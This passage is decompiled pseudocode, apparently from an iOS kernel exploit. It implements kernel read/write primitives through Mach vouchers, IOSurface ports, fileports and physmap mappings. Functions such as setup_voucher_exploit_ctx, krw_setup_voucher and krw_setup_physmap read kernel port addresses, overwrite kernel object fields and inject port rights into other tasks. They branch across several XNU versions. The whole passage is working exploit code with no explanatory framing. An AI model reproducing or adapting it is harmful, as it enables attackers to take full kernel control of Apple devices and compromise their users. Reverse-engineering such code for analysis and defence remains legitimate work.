  if ( !(uint32_t)result )
  {
    if ( *(uint64_t *)task_info_out )
    {
      result = 0;
      *a2 = *(uint64_t *)task_info_out;
    }
    else
    {
      return 5;
    }
  }
  return result;
}

//----- (000000000001BD80) ----------------------------------------------------
__int64 __fastcall iosurface_enum_mach_port(__int64 a1, unsigned int a2)
{
  unsigned int v2; // w0
  unsigned int v3; // w19
  __int64 v5; // [xsp+8h] [xbp-18h] BYREF

  v2 = iosurface_id_to_index(a2);
  if ( (v2 & 0x80000000) != 0 )
    return 0;
  v3 = v2;
  if ( (unsigned int)get_task_vm_info_0(mach_task_self_, &v5) )
    return 0;
  if ( v3 <= 7 )
    return v5 + 4LL * (v3 + 6) + 232;
  return 0;
}

//----- (000000000001BDEC) ----------------------------------------------------
__int64 __fastcall iosurface_id_to_index(unsigned int a1)
{
  if ( a1 > 0x19 )
    return 0xFFFFFFFFLL;
  else
    return kIOSurfaceIdToTaskVmInfoIndex[a1];
}

//----- (000000000001BE0C) ----------------------------------------------------
__int64 __fastcall get_iosurface_mem_entry(struct_krwCtx *krwCtx, unsigned int a2, mach_port_name_t *a3)
{
  // struct_krwCtx *krwCtx; // x20
  mach_port_name_t *v6; // x0
  mach_port_name_t *v7; // x20
  mach_port_name_t v8; // w1
  kern_return_t v9; // w0
  __int64 result; // x0
  unsigned int v11; // w1
  unsigned __int64 v12; // [xsp+0h] [xbp-30h] BYREF
  mach_port_name_t name; // [xsp+Ch] [xbp-24h] BYREF

  name = 0;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
  {
    if ( voucher_create_mach_voucher(krwCtx, a2 + 0x1122334455667788LL, &name) )
    {
LABEL_7:
      result = 0;
      *a3 = name;
      return result;
    }
    return 4097;
  }
  v6 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, a2);
  if ( v6 )
  {
    v7 = v6;
    v8 = *v6;
    name = v8;
    if ( v8 + 1 > 1 )
      goto LABEL_4;
    v12 = 0;
    if ( a2 - 19 >= 2 )
    {
      if ( a2 != 16 )
        return 4097;
      v11 = 11;
    }
    else
    {
      v11 = 12;
    }
    if ( (unsigned int)lookup_physmap_page_slot(krwCtx, v11, (__int64 *)&v12) && v12 )
    {
      result = plist_elem_is_string_6(krwCtx, v12, &name);
      if ( (uint32_t)result )
        return result;
      if ( name + 1 >= 2 )
      {
        v9 = mach_port_mod_refs(mach_task_self_, name, 0, 0xFFFF);
        if ( v9 )
          return v9 | 0x80000000;
        *v7 = name;
        v8 = name;
LABEL_4:
        v9 = mach_port_mod_refs(mach_task_self_, v8, 0, 1);
        if ( v9 )
          return v9 | 0x80000000;
        goto LABEL_7;
      }
    }
  }
  return 4097;
}

//----- (000000000001BF68) ----------------------------------------------------
__int64 __fastcall alloc_vm_page_mem_entry(struct_krwCtx *krwCtx, unsigned int a2, vm_size_t size, vm_address_t *address)
{
  __int64 v6; // x21
  kern_return_t v7; // w0
  mem_entry_name_port_t object; // [xsp+Ch] [xbp-24h] BYREF

  object = 0;
  v6 = get_iosurface_mem_entry(krwCtx, a2, &object);
  if ( !(uint32_t)v6 )
  {
    if ( !address )
    {
      v6 = 0;
      goto LABEL_11;
    }
    v7 = vm_map(mach_task_self_, address, size, 0, 1, object, 0, 0, 3, 3, 2u);
    if ( v7 )
      v6 = v7 | 0x80000000;
    else
      v6 = 0;
    if ( !(uint32_t)v6 )
      goto LABEL_11;
  }
  if ( address && *address )
  {
    vm_deallocate(mach_task_self_, *address, size);
    *address = 0;
  }
LABEL_11:
  if ( object + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, object);
  return v6;
}

//----- (000000000001C058) ----------------------------------------------------
__int64 __fastcall alloc_vm_page(struct_krwCtx *krwCtx)
{
  vm_size_t v2; // x20
  __int64 result; // x0
  vm_address_t v4; // [xsp+8h] [xbp-18h] BYREF

  v4 = 0;
  v2 = vm_page_size;
  if ( krwCtx->mappedKernelRegion && krwCtx->mappedKernelSize )
    return 0;
  result = alloc_vm_page_mem_entry(krwCtx, 0x10u, vm_page_size, &v4);
  if ( !(uint32_t)result )
  {
    krwCtx->mappedKernelRegion = v4;
    krwCtx->mappedKernelSize = v2;
  }
  return result;
}

//----- (000000000001C0C8) ----------------------------------------------------
bool __fastcall krw_setup_with_stat(struct_krwCtx *krwCtx, uint32_t *a2)
{
  unsigned __int64 v4; // x8
  __int64 v5; // x24
  __int64 v6; // x21
  ipc_voucher_t *v7; // x22
  __int32 *v8; // x25
  __int64 v9; // x27
  __int32 *v10; // x20
  int v11; // w8
  int v13; // w0
  unsigned __int64 v14; // x8
  __darwin_time_t tv_sec; // x22
  unsigned __int64 v16; // x8
  unsigned __int64 v17; // x22
  unsigned __int64 v18; // x8
  __int64 v19; // x22
  struct stat v20; // [xsp+0h] [xbp-110h] BYREF
  int nullFd; // [xsp+94h] [xbp-7Ch] BYREF
  __int32 v22[2]; // [xsp+98h] [xbp-78h] BYREF
  __int64 v23; // [xsp+A0h] [xbp-70h]
  uint64_t v24[2]; // [xsp+A8h] [xbp-68h] BYREF

  v24[0] = 0;
  v24[1] = 0;
  *(uint64_t *)v22 = -1;
  v23 = -1;
  nullFd = -1;
  v4 = krwCtx->xnuVersionPacked;
  if ( v4 > XNU_VERSION_PACKED(7195, 42, 0, 1023, 1023) && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
  {
    v5 = 3;
  }
  else if ( v4 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
  {
    v5 = 3;
  }
  else
  {
    v5 = 4;
  }
  if ( (unsigned int)fd_open_dev_null(&nullFd) )
  {
LABEL_14:
    v10 = v22;
    do
    {
      if ( *v10 != -1 )
        close(*v10);
      ++v10;
      --v5;
    }
    while ( v5 );
    v11 = 0;
  }
  else
  {
    v6 = 0x1122334455667788LL;
    v7 = (ipc_voucher_t *)v24;
    v8 = v22;
    v9 = v5;
    do
    {
      if ( !voucher_create_mach_voucher(krwCtx, v6, v7) )
        goto LABEL_13;
      *v8 = j__fileport_makefd(*v7);
      mach_port_deallocate(mach_task_self_, *v7);
      *v7 = 0;
      if ( *v8 < 0 )
        goto LABEL_13;
      ++v6;
      ++v7;
      ++v8;
      --v9;
    }
    while ( v9 );
    if ( (unsigned int)setup_two_fds(v22) )
    {
LABEL_13:
      fd_close(nullFd);
      goto LABEL_14;
    }
    v13 = v22[1];
    krwCtx->krw_pipe_0 = v22[0];
    krwCtx->krw_pipe_1 = v13;
    v14 = krwCtx->xnuVersionPacked;
    if ( v14 > XNU_VERSION_PACKED(7195, 42, 0, 1023, 1023) && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v14 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)) )
      krwCtx->iosurfaceFd_size4 = v23;
    else
      krwCtx->pipeFd0 = v23;
    if ( !fstat(v13, &v20) )
    {
      tv_sec = v20.st_atimespec.tv_sec;
      if ( validate_kaddr_range(krwCtx, v20.st_atimespec.tv_sec) )
        krwCtx->gap_0x19D0_size8 = tv_sec;
      v16 = krwCtx->xnuVersionPacked;
      if ( v16 > XNU_VERSION_PACKED(7195, 42, 0, 1023, 1023) && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v16 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)) )
      {
        v17 = v20.st_atimespec.tv_nsec | 0xFFFFFF0000000000LL;
        if ( validate_kaddr_range(krwCtx, v20.st_atimespec.tv_nsec | 0xFFFFFF0000000000LL) )
          krwCtx->gap_0x218 = v17;
        v18 = ((unsigned __int64)v20.st_atimespec.tv_nsec >> 40) * krwCtx->pageSizeOrSomething;
        if ( v18 && (krwCtx->pageMask & v18) == 0 )
          krwCtx->gap_0x19E0_size8 = v18;
        if ( krwCtx->krw_pipe_0 != -1 && krwCtx->krw_pipe_1 != -1 && krwCtx->iosurfaceFd_size4 != -1 )
        {
          if ( krwCtx->gap_0x218 )
          {
            if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) && !(unsigned int)alloc_vm_page(krwCtx) )
            {
              v19 = *(uint64_t *)(krwCtx->mappedKernelRegion + 256LL);
              if ( validate_kaddr_range(krwCtx, v19) )
                krwCtx->gap_0x220 = v19;
            }
          }
        }
      }
      else if ( v20.st_atimespec.tv_nsec && (krwCtx->pageMask & v20.st_atimespec.tv_nsec) == 0 )
      {
        krwCtx->gap_0x19E0_size8 = v20.st_atimespec.tv_nsec;
      }
    }
    fd_read_test(&krwCtx->krw_pipe_0);
    fd_close(nullFd);
    v11 = 1;
  }
  *a2 = v11;
  return true;
}

//----- (000000000001C3EC) ----------------------------------------------------
bool __fastcall krw_setup_ports_vm(struct_krwCtx *krwCtx, uint32_t *a2)
{
  vm_size_t v4; // x20
  int v5; // w8
  bool result; // w0
  __int64 v7; // x24
  ipc_voucher_t *v8; // x22
  mach_port_name_t *v9; // x0
  mach_port_name_t v10; // w1
  __int64 i; // x21
  mach_port_name_t v12; // w1
  int v13; // w21
  bool v14; // zf
  __int64 v15; // x22
  __int64 v16; // x22
  __int64 v17; // x22
  int v18; // w24
  unsigned __int64 v19; // x0
  mach_port_t v20; // w9
  vm_size_t v21; // x8
  bool v22; // cf
  int v23; // [xsp+14h] [xbp-7Ch] BYREF
  vm_address_t v24; // [xsp+18h] [xbp-78h] BYREF
  vm_address_t address; // [xsp+20h] [xbp-70h] BYREF
  __int128 v26; // [xsp+28h] [xbp-68h]
  mach_port_t connection[2]; // [xsp+38h] [xbp-58h] BYREF
  mem_entry_name_port_t object; // [xsp+40h] [xbp-50h]

  object = 0;
  *(uint64_t *)connection = 0;
  address = 0;
  v4 = vm_page_size;
  v24 = 0;
  v23 = -1;
  v5 = fd_open_dev_null(&v23);
  result = false;
  if ( !v5 )
  {
    v7 = -3;
    v8 = connection;
    do
    {
      if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
      {
        result = voucher_create_mach_voucher(krwCtx, v7 + 0x312233445566778BLL, v8) != 0;
        if ( !result )
          break;
        if ( *v8 + 1 < 2 )
          goto LABEL_16;
      }
      else
      {
        v9 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, (int)v7 + 3);
        if ( !v9 )
          goto LABEL_16;
        v10 = *v9;
        *v8 = *v9;
        if ( v10 + 1 < 2 )
          goto LABEL_16;
        result = mach_port_mod_refs(mach_task_self_, v10, 0, 1);
        if ( (uint32_t)result )
          goto LABEL_16;
      }
      ++v8;
      v22 = __CFADD__(v7++, 1);
    }
    while ( !v22 );
    if ( (krwCtx->xnuMajorVersion > 8791 || IOConnectCallMethod(connection[1], 0x3E7u, 0, 0, 0, 0, 0, 0, 0, 0) == -536870201)
      && !vm_map(mach_task_self_, &address, v4, 0, 1, connection[0], 0, 0, 3, 3, 2u)
      && !vm_map(mach_task_self_, &v24, v4, 0, 1, object, 0, 0, 3, 3, 2u) )
    {
      v15 = *(uint64_t *)v24;
      if ( validate_kaddr_range(krwCtx, *(uint64_t *)v24) )
      {
        krwCtx->gap_0x19D0_size8 = v15;
        v16 = *(uint64_t *)(v24 + 8);
        if ( validate_kaddr_range(krwCtx, v16) )
        {
          krwCtx->ioConnectKernelValue = v16;
          v17 = *(unsigned int *)(v24 + 16);
          v18 = *(uint32_t *)(v24 + 20);
          v19 = krw_xpac_vaddr_2(krwCtx, *(uint64_t *)(address + v17));
          if ( validate_kaddr_range(krwCtx, v19) )
          {
            v20 = connection[0];
            krwCtx->ioConnectPort = connection[1];
            krwCtx->ioConnectMappedAddr = address;
            krwCtx->ioConnectMappedSize = v4;
            krwCtx->ioConnectMemPort = v20;
            krwCtx->ioConnectDataSize = v18;
            krwCtx->ioConnectDataOffset = v17;
            fd_close(v23);
            v13 = 1;
            goto LABEL_24;
          }
          v26 = 0u;
          if ( v4 )
          {
            v21 = 0;
            do
            {
              v14 = v26 == *(__int128 *)(address + v21);
              v21 = (unsigned int)(v21 + 16);
              v22 = !v14 || v21 >= v4;
            }
            while ( !v22 );
          }
        }
      }
    }
LABEL_16:
    fd_close(v23);
    if ( address && v4 )
      vm_deallocate(mach_task_self_, address, v4);
    for ( i = 0; i != 3; ++i )
    {
      v12 = connection[i];
      if ( v12 + 1 >= 2 )
        mach_port_deallocate(mach_task_self_, v12);
    }
    v13 = 0;
LABEL_24:
    if ( v24 )
      v14 = v4 == 0;
    else
      v14 = 1;
    if ( !v14 )
      vm_deallocate(mach_task_self_, v24, v4);
    *a2 = v13;
    return true;
  }
  return result;
}

//----- (000000000001C720) ----------------------------------------------------
__int64 __fastcall setup_voucher_exploit_ctx(struct_krwCtx *krwCtx, unsigned int *a2, unsigned int a3)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  __int64 v8; // x22
  unsigned __int64 v10; // x23
  __int64 v11; // x24
  unsigned __int64 v12; // x22
  int v13; // w8
  __int64 v14; // x20
  int v15; // [xsp+0h] [xbp-40h] BYREF
  uint8_t v16[4]; // [xsp+4h] [xbp-3Ch] BYREF
  unsigned __int64 v17; // [xsp+8h] [xbp-38h] BYREF

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  v8 = 56;
  if ( xnuMajorVersion <= 8018 )
  {
    if ( xnuMajorVersion != 6153 && xnuMajorVersion != 7195 )
      return result;
  }
  else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
  {
    if ( xnuMajorVersion != 8792 )
      return result;
    v8 = 48;
  }
  result = task_self_get_ipc_port(krwCtx, *a2);
  if ( result )
  {
    v10 = result;
    result = kread_u32(krwCtx, result, &v15);
    if ( (uint32_t)result )
    {
      if ( (v15 & 0x3FF) != 0x25 )
        return 0;
      result = maybe_ipc_port_get_kobject(krwCtx, v10);
      if ( result )
      {
        v11 = result;
        v12 = result + v8;
        v13 = kread_physmap_decorated(krwCtx, v12, &v17);
        result = 0;
        if ( v13 && v10 == v17 )
        {
          result = kread_u32(krwCtx, v11 + 8, v16);
          if ( (uint32_t)result )
          {
            result = noppl_kwrite32(krwCtx, v11 + 8, 0xFFFF);
            if ( (uint32_t)result )
            {
              if ( mach_port_deallocate(mach_task_self_, *a2) )
                return 0;
              *a2 = 0;
              result = task_self_get_ipc_port(krwCtx, a3);
              if ( result )
              {
                v14 = result;
                result = kwrite64(krwCtx, v12, result);
                if ( (uint32_t)result )
                {
                  kread_and_vm_attr_double(krwCtx, v14);
                  return 1;
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (000000000001C8B0) ----------------------------------------------------
__int64 __fastcall alloc_iosurface_mach_port(struct_krwCtx *krwCtx, unsigned int a2, unsigned int a3)
{
  __int64 v6; // x0
  uint32_t *v7; // x21
  __int64 v8; // x0
  __int64 v9; // x23
  __int64 v10; // x22
  unsigned int v11; // w22
  kern_return_t v12; // w0
  __int64 v14; // [xsp+0h] [xbp-40h] BYREF
  mach_port_name_t name; // [xsp+Ch] [xbp-34h] BYREF

  name = 0;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
  {
    if ( voucher_create_mach_voucher(krwCtx, a2 + 0x1122334455667788LL, &name)
      && (unsigned int)setup_voucher_exploit_ctx(krwCtx, &name, a3) )
    {
      goto LABEL_9;
    }
  }
  else
  {
    v14 = 0;
    v6 = iosurface_enum_mach_port(krwCtx, a2);
    if ( v6 )
    {
      v7 = (uint32_t *)v6;
      v8 = task_self_get_ipc_port(krwCtx, a3);
      if ( !v8 )
      {
        v10 = 163854;
        goto LABEL_19;
      }
      v9 = v8;
      v10 = kread_and_vm_attr_double(krwCtx, v8);
      if ( (uint32_t)v10 )
        goto LABEL_19;
      if ( a2 - 19 >= 2 )
      {
        if ( a2 != 16 )
        {
LABEL_16:
          v12 = mach_port_mod_refs(mach_task_self_, a3, 0, 0xFFFF);
          if ( v12 )
          {
            v10 = v12 | 0x80000000;
            goto LABEL_19;
          }
          *v7 = a3;
LABEL_9:
          v10 = 0;
          goto LABEL_19;
        }
        v11 = 11;
      }
      else
      {
        v11 = 12;
      }
      if ( (unsigned int)lookup_physmap_page_slot(krwCtx, v11, &v14) && (v14 || (unsigned int)cache_physmap_page_slot(krwCtx, v11, v9)) )
        goto LABEL_16;
    }
  }
  v10 = 4097;
LABEL_19:
  if ( name + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, name);
  return v10;
}

//----- (000000000001CA3C) ----------------------------------------------------
__int64 __fastcall insert_mach_port_send_right(struct_krwCtx *krwCtx, task_name_t a2, unsigned int a3, __int64 a4, unsigned int a5)
{
  __int64 v5; // x21
  __int64 v6; // x22
  __int64 v10; // x25
  __int64 v11; // x26
  __int64 v12; // x24
  unsigned int v13; // w1
  int inserted; // w0
  __int64 v15; // x23
  __int64 v16; // x25
  char *v17; // x22
  unsigned int v18; // w0
  unsigned int v19; // w0
  kern_return_t v20; // w0
  mach_port_t *v22; // x23
  uint32_t *v23; // x26
  mach_port_t v24; // w22
  uint64_t *v25; // x23
  unsigned int v26; // w0
  unsigned int v27; // w0
  char v29; // [xsp+14h] [xbp-8Ch]
  mach_vm_size_t outsize; // [xsp+18h] [xbp-88h] BYREF
  __int64 v31; // [xsp+20h] [xbp-80h] BYREF
  uint64_t v32[2]; // [xsp+28h] [xbp-78h] BYREF
  uint64_t v33[2]; // [xsp+38h] [xbp-68h] BYREF

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
    return 0;
  LODWORD(v5) = a3;
  if ( a3 - 1 > 3 )
    return 708609;
  v10 = 0;
  v11 = 163857;
  v33[0] = 0;
  v33[1] = 0;
  v12 = a3;
  v6 = 163848;
  do
  {
    if ( a4 )
      v13 = *(uint32_t *)(a4 + 4 * v10);
    else
      v13 = v10;
    uint64_t a1 = iosurface_enum_mach_port(krwCtx, v13);
    if ( !a1 )
      return 4097;
    if ( (unsigned int)(*(uint32_t *)a1 + 1) <= 1 && ((a5 >> v10) & 1) != 0 )
      return v6;
    *((uint32_t *)v33 + v10++) = *(uint32_t *)a1;
  }
  while ( (unsigned int)v5 != v10 );
  inserted = get_task_vm_info_0(a2, &v31);
  if ( inserted )
    return inserted | 0x80000000;
  v15 = 0;
  v29 = 0;
  v32[0] = 0;
  v32[1] = 0;
  v16 = v31 + 232;
LABEL_16:
  v17 = (char *)v32 + 4 * v15;
  do
  {
    if ( a4 )
      v18 = *(uint32_t *)(a4 + 4 * v15);
    else
      v18 = v15;
    v19 = iosurface_id_to_index(v18);
    if ( v19 > 7 )
      return v11;
    v20 = mach_vm_read_overwrite(a2, v16 + 4LL * (v19 + 6), 4u, (mach_vm_address_t)v17, &outsize);
    if ( v20 )
      return v20 | 0x80000000;
    if ( (unsigned int)(*((uint32_t *)v32 + v15) + 1) <= 1 && (unsigned int)(*((uint32_t *)v33 + v15) + 1) >= 2 )
    {
      v29 = 1;
      if ( (unsigned int)v5 - 1LL != v15++ )
        goto LABEL_16;
      goto LABEL_32;
    }
    ++v15;
    v17 += 4;
  }
  while ( (unsigned int)v5 != v15 );
  if ( (v29 & 1) == 0 )
    return 0;
LABEL_32:
  v22 = (mach_port_t *)v33;
  v23 = v32;
  do
  {
    LODWORD(outsize) = 0;
    v24 = *v22;
    if ( *v22 + 1 >= 2 )
    {
      inserted = mach_port_allocate(a2, 1u, (mach_port_name_t *)&outsize);
      if ( inserted )
        return inserted | 0x80000000;
      inserted = mach_port_mod_refs(a2, outsize, 1u, -1);
      if ( inserted )
        return inserted | 0x80000000;
      inserted = mach_port_insert_right(a2, outsize, v24, 0x13u);
      if ( inserted )
        return inserted | 0x80000000;
      inserted = mach_port_mod_refs(a2, outsize, 0, 0xFFFF);
      if ( inserted )
        return inserted | 0x80000000;
      *v23 = outsize;
    }
    ++v22;
    ++v23;
    --v12;
  }
  while ( v12 );
  v25 = v32;
  if ( (unsigned int)v5 <= 1 )
    v5 = 1;
  else
    v5 = (unsigned int)v5;
  while ( 1 )
  {
    v26 = a4 ? *(uint32_t *)(a4 + 4 * v12) : v12;
    v27 = iosurface_id_to_index(v26);
    if ( v27 > 7 )
      break;
    inserted = mach_vm_write(a2, v16 + 4LL * (v27 + 6), (vm_offset_t)v25, 4u);
    if ( inserted )
      return inserted | 0x80000000;
    v6 = 0;
    ++v12;
    v25 = (uint64_t *)((char *)v25 + 4);
    if ( v5 == v12 )
      return v6;
  }
  return 163857;
}

//----- (000000000001CD34) ----------------------------------------------------
__int64 __fastcall mementry_iosurface_port_alloc(struct_krwCtx *krwCtx, unsigned int a2, vm_size_t size, vm_offset_t offset, vm_address_t *a5)
{
  int v10; // w25
  vm_offset_t v11; // x2
  kern_return_t memory_entry; // w0
  __int64 v13; // x22
  kern_return_t v14; // w0
  bool v15; // zf
  vm_size_t sizea; // [xsp+18h] [xbp-58h] BYREF
  mem_entry_name_port_t object_handle; // [xsp+24h] [xbp-4Ch] BYREF
  vm_address_t address; // [xsp+28h] [xbp-48h] BYREF

  address = offset;
  object_handle = 0;
  sizea = size;
  v10 = offset == 0;
  v11 = offset;
  if ( !offset )
  {
    v14 = vm_allocate(mach_task_self_, &address, size, 1);
    if ( v14 )
    {
      v10 = 0;
      v13 = v14 | 0x80000000;
      goto LABEL_19;
    }
    v11 = address;
  }
  memory_entry = mach_make_memory_entry(mach_task_self_, &sizea, v11, 3, &object_handle, 0);
  if ( memory_entry )
  {
LABEL_3:
    v13 = memory_entry | 0x80000000;
    goto LABEL_12;
  }
  if ( sizea == size )
  {
    v13 = alloc_iosurface_mach_port(krwCtx, a2, object_handle);
    if ( (uint32_t)v13 || offset )
      goto LABEL_12;
    memory_entry = vm_map(mach_task_self_, a5, size, 0, 1, object_handle, 0, 0, 3, 3, 2u);
    if ( !memory_entry )
    {
      bzero((void *)*a5, size);
      v13 = 0;
      goto LABEL_19;
    }
    goto LABEL_3;
  }
  v13 = 708642;
LABEL_12:
  if ( (uint32_t)v13 )
    v15 = offset == 0;
  else
    v15 = 0;
  if ( v15 && *a5 )
    vm_deallocate(mach_task_self_, *a5, size);
LABEL_19:
  if ( object_handle + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, object_handle);
  if ( v10 )
    vm_deallocate(mach_task_self_, address, size);
  return v13;
}

//----- (000000000001CEC4) ----------------------------------------------------
__int64 __fastcall alloc_vm_page_v2(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  vm_size_t v3; // x9
  vm_address_t v4; // [xsp+8h] [xbp-18h] BYREF

  v4 = 0;
  result = mementry_iosurface_port_alloc(krwCtx, 0x10u, vm_page_size, 0, &v4);
  if ( !(uint32_t)result )
  {
    v3 = vm_page_size;
    krwCtx->mappedKernelRegion = v4;
    krwCtx->mappedKernelSize = v3;
  }
  return result;
}

//----- (000000000001CF1C) ----------------------------------------------------
bool __fastcall krw_setup_voucher(struct_krwCtx *krwCtx)
{
  __int64 v2; // x20
  bool result; // w0
  uint32_t v4; // w8
  uint32_t v5; // w8
  __int64 v6; // x9
  __int64 v7; // x10
  unsigned __int64 v8; // x22
  __int64 v9; // x24
  int v10; // w8
  unsigned __int64 v11; // x8
  unsigned __int64 v12; // x1
  unsigned __int64 v13; // x2
  unsigned __int64 portKaddr; // x0
  __int64 v14; // [xsp+8h] [xbp-88h] BYREF
  mach_port_name_t name; // [xsp+10h] [xbp-80h] BYREF
  int v16; // [xsp+14h] [xbp-7Ch] BYREF
  uint32_t v17[4]; // [xsp+18h] [xbp-78h]
  ipc_voucher_t v18[4]; // [xsp+28h] [xbp-68h] BYREF

  v2 = 0x1122334455667788LL;
  result = voucher_create_mach_voucher(krwCtx, 0x1122334455667788LL, v18) != 0;
  if ( result )
  {
    portKaddr = task_self_get_ipc_port(krwCtx, v18[0]);
    result = portKaddr != 0;
    if ( result )
    {
      result = kread_u32(krwCtx, portKaddr, &v16);
      if ( result )
      {
        if ( (v16 & 0x3FF) == 0x22 )
        {
          return true;
        }
        else
        {
          result = false;
          v4 = krwCtx->krw_pipe_1;
          v17[0] = krwCtx->krw_pipe_0;
          v17[1] = v4;
          if ( v17[0] != -1 && v4 != -1 )
          {
            v5 = krwCtx->iosurfaceFd;
            if ( v5 != -1 && krwCtx->gap_0x218 )
            {
              v6 = 3;
              v7 = 2;
LABEL_13:
              v8 = 0;
              v17[v7] = v5;
              v9 = 4 * v6;
              while ( 1 )
              {
                name = 0;
                if ( voucher_create_mach_voucher(krwCtx, v2, &v18[v8 / 4])
                  && !(unsigned int)j__fileport_makeport(v17[v8 / 4], &name) )
                {
                  if ( !v8 && !(unsigned int)get_task_bsd_info_kaddr(krwCtx, name, &v14) )
                  {
                    v10 = krwCtx->xnuMajorVersion;
                    if ( (unsigned int)(v10 - 8019) >= 2 && v10 != 8792 && v10 != 7195 )
                      return false;
                    kwrite_physmap_with_a3_ptr(krwCtx, v14 + 280, krwCtx->gap_0x19D0);
                    v11 = krwCtx->xnuVersionPacked;
                    if ( v11 >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0) && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v11 >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0)) )
                    {
                      v13 = (krwCtx->gap_0x218 & 0xFFFFFFFFFFLL)
                          | ((unsigned __int64)(unsigned int)(krwCtx->slideMaybe / (unsigned int)krwCtx->pageSizeOrSomething) << 40);
                      v12 = v14 + krwCtx->stride_0x168 + 280;
                    }
                    else
                    {
                      v12 = v14 + krwCtx->stride_0x168 + 280;
                      v13 = krwCtx->slideMaybe;
                    }
                    kwrite_physmap_with_a3_ptr(krwCtx, v12, v13);
                  }
                  setup_voucher_exploit_ctx(krwCtx, &v18[v8 / 4], name);
                  mach_port_deallocate(mach_task_self_, name);
                }
                v8 += 4LL;
                ++v2;
                if ( v9 == v8 )
                  return true;
              }
            }
            if ( krwCtx->pipeFd0 != -1 )
            {
              v5 = krwCtx->pipeFd1;
              if ( v5 != -1 )
              {
                v17[2] = krwCtx->pipeFd0;
                v6 = 4;
                v7 = 3;
                goto LABEL_13;
              }
            }
            return false;
          }
        }
      }
    }
  }
  return result;
}

//----- (000000000001D1B0) ----------------------------------------------------
bool __fastcall krw_setup_physmap(struct_krwCtx *krwCtx)
{
  // struct_krwCtx *krwCtx; // x19
  vm_size_t v2; // x20
  bool result; // w0
  unsigned int v4; // w1
  ipc_voucher_t v5; // w8
  kern_return_t memory_entry; // w8
  kern_return_t v7; // w8
  vm_address_t v8; // x1
  __int64 portKaddr; // x0
  __int64 v9; // x20
  unsigned int *v10; // x21
  unsigned int *v11; // x22
  unsigned int v12; // w23
  ipc_voucher_t v13; // [xsp+10h] [xbp-90h] BYREF
  mem_entry_name_port_t object_handle; // [xsp+14h] [xbp-8Ch] BYREF
  vm_address_t address; // [xsp+18h] [xbp-88h] BYREF
  vm_size_t size; // [xsp+20h] [xbp-80h] BYREF
  int v17; // [xsp+2Ch] [xbp-74h] BYREF
  unsigned int v18; // [xsp+30h] [xbp-70h] BYREF
  ipc_voucher_t v19[3]; // [xsp+3Ch] [xbp-64h] BYREF

  v2 = vm_page_size;
  address = 0;
  size = vm_page_size;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8020, 241, 7, 1023, 1023) )
  {
    v19[0] = 0;
    result = voucher_create_mach_voucher(krwCtx, 0x3122334455667788LL, v19) != 0;
    if ( !result )
      return result;
    v4 = v19[0];
  }
  else
  {
    v11 = (unsigned int *)iosurface_enum_mach_port(krwCtx, 0);
    if ( !v11 )
      return false;
    v4 = *v11;
  }
  v18 = v4;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8020, 241, 7, 1023, 1023) )
  {
    portKaddr = task_self_get_ipc_port(krwCtx, v4);
    if ( !portKaddr )
      return false;
    result = kread_u32(krwCtx, portKaddr, &v17);
    if ( !result )
      return result;
    if ( (v17 & 0x3FF) == 0x1C )
      return true;
  }
  else if ( v4 + 1 > 1 )
  {
    return true;
  }
  v5 = krwCtx->ioConnectPort;
  if ( v5 + 1 < 2 )
    return false;
  if ( !krwCtx->ioConnectMappedAddr )
    return false;
  if ( !krwCtx->ioConnectMappedSize )
    return false;
  if ( (unsigned int)(krwCtx->ioConnectMemPort + 1) < 2 )
    return false;
  v19[0] = krwCtx->ioConnectMemPort;
  v19[1] = v5;
  if ( !krwCtx->gap_0x19D0_size8 || !krwCtx->ioConnectKernelValue )
    return false;
  memory_entry = mach_make_memory_entry(mach_task_self_, &size, 0, 131075, &object_handle, 0);
  result = false;
  if ( !memory_entry )
  {
    v19[2] = object_handle;
    v7 = vm_map(mach_task_self_, &address, v2, 0, 1, object_handle, 0, 0, 3, 3, 2u);
    result = false;
    if ( !v7 )
    {
      bzero((void *)address, v2);
      v8 = address;
      *(uint64_t *)address = krwCtx->gap_0x19D0_size8;
      *(uint64_t *)(v8 + 8) = krwCtx->ioConnectKernelValue;
      *(uint32_t *)(v8 + 16) = krwCtx->ioConnectDataOffset;
      *(uint32_t *)(v8 + 20) = krwCtx->ioConnectDataSize;
      result = vm_deallocate(mach_task_self_, v8, v2);
      v9 = 0;
      v10 = &v18;
      do
      {
        if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8020, 241, 7, 1023, 1023) )
        {
          v13 = 0;
          result = voucher_create_mach_voucher(krwCtx, v9 + 0x3122334455667788LL, &v13) != 0;
          if ( !result )
            return result;
          *v10 = v13;
          result = setup_voucher_exploit_ctx(krwCtx, v10, v19[v9]) != 0;
          if ( !result )
            return result;
        }
        else
        {
